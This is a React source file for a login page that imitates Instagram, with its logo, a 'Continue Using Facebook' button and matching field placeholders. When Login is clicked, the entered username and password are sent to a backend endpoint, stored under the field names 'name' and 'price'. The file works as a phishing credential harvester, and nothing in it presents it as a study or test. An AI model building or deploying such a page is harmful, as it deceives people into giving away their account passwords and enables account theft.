import React, { useState, useEffect } from 'react';
import Instagram from './pngegg.png';
import './App.css';
import axios from "axios";

const baseURL = "http://127.0.0.1:8000/items";
function App() {
  const [email, setEmail] = useState("");
  const [post, setPost] =useState(null);
  console.log(post)
  const [password, setPassword] = useState("");
  const [open, setOpen] = useState(false)
  const inputEmailHandler = (e) => {
    setEmail(e.target.value);
  };
  const inputPasswordHandler = (e) => {
    setPassword(e.target.value);
  };
  //push test
  //comment test
  //push test
  //comment
  //master pull
  //test pull and update
  useEffect(() => {

    if (password.length > 5) {
      setOpen(true)
    }

  }, [password])
//commit url
//commit url2
  useEffect(() => {
    axios.get(baseURL).then((response) => {
      setPost(response.data);
    });
  }, []);
function aqib(email,password){
  console.log("Aqib")
  axios.post((baseURL), {
    "id": 6,
    "name": email,
    "price": password
  })
  .then(res => {
    console.log(res);
    console.log(res.data);
})
}
  
  const Submit = () => {
    aqib(email,password)
    setPassword("")
    setEmail("")
    setOpen(false)
  }
  return (
    <div >
      <div style={{ display: "flex", width: "100%", height: "5%" }}>
        <div style={{ display: "flex", width: "5%", height: "100%" }}>...</div>
        <div style={{ width: "95%", height: "100%", alignItems: "center", display: "flex", justifyContent: "center" }}>
          <select id="country" name="country">
            <option value="au">English</option>
            <option value="ca">Hindi</option>
            <option value="usa">English (UK)</option>
            <option value="ca">Dansk</option>
            <option value="ca">Suomi</option>
            <option value="ca">Italiano</option>
            <option value="ca">Polski</option>
            <option value="ca">Filipino</option>
            <option value="ca">Svenska</option>
            <option value="ca">Turkce</option>
            <option value="ca">Magyar</option>
            <option value="ca">Afrikaans</option>
          </select></div>
      </div>
      <div style={{ width: "100%", height: "20%", marginTop: "5%", justifyContent: "space-around", display: "flex" }}>
        <div style={{ display: "flex", width: "50%", height: "70%" }}><img src={Instagram}></img></div>
      </div>

      <div style={{ width: "100%", height: "5%", justifyContent: "space-around", display: "flex" }}>
        <div style={{ width: "70%", height: "100%", background: "rgb(85, 151, 236)", borderRadius: "4px", display: "flex", justifyContent: "center" }}>
          <div style={{ display: "flex", width: "90%", height: "80%", fontSize: "20px", fontFamily: "inherit", fontWeight: "600", color: "white", marginTop: "5px" }}>Continue Using Facebook</div>
        </div>
      </div>
      <div style={{ width: "100%", height: "5%", display: "flex", justifyContent: "center" }}>
        <div style={{ display: "flex", width: "30%", height: "100%", borderBottom: "1px solid #808080" }}></div>
        <div style={{ width: "10%", height: "50%", marginTop: "28px", display: "flex", justifyContent: "center", fontSize: "20px", fontFamily: "inherit", fontWeight: "600" }}>OR</div>
        <div style={{ display: "flex", width: "30%", height: "100%", borderBottom: "1px solid #808080" }}> </div>
      </div>
      <div style={{ display: "flex", width: "100%", height: "6%", marginTop: "8%", justifyContent: "center" }}>
        <input
          value={email}
          onChange={inputEmailHandler}
          style={{ width: "70%", height: "80%", justifyContent: "center", borderRadius: "4px", borderColor: "#808080", fontWeight: "600", background: "rgb(245, 244, 244)" }}
          placeholder="Phone number, username or email address"></input>

      </div>
      <div style={{ display: "flex", width: "100%", height: "6%", marginTop: "3%", justifyContent: "center" }}>
        <input
          type='password'
          value={password}
          onChange={inputPasswordHandler}
          style={{ width: "70%", height: "80%", justifyContent: "center", borderRadius: "4px", borderColor: "#808080", fontWeight: "600", background: "rgb(245, 244, 244)" }}
          placeholder="Password"></input>

      </div>
      <div
     
      style={{ display: "flex", width: "100%", height: "6%", marginTop: "3%", marginLeft: "22%", justifyContent: "center", fontWeight: "600", color: "rgb(40, 112, 206)" }}>
        Forget password ?
      </div>
      <div style={{ width: "100%", height: "5%", justifyContent: "space-around", display: "flex" }}>
        <div style={{ width: "70%", height: "100%", background: open !== true ? "rgb(167, 204, 230)" : "rgb(85, 151, 236)", borderRadius: "4px", display: "flex", justifyContent: "center" }}>
          <div
             onClick={Submit}
            style={{ display: "flex", width: "90%", height: "80%", fontSize: "20px", fontFamily: "inherit", fontWeight: "600", color: "white", marginTop: "5px", textAlign: "center" }}>
            <span>Login</span>
          </div>
        </div>
      </div>
      <div style={{ width: "100%", height: "6%", marginTop: "3%", justifyContent: "center", fontSize: "17px", fontWeight: "600", color: "rgb(132, 147, 158)", textAlign: "center" }}>
        Don't have an account? <span style={{ color: "rgb(40, 112, 206)" }}>Sign up</span>
      </div>

    </div>
  );
}

export default App;
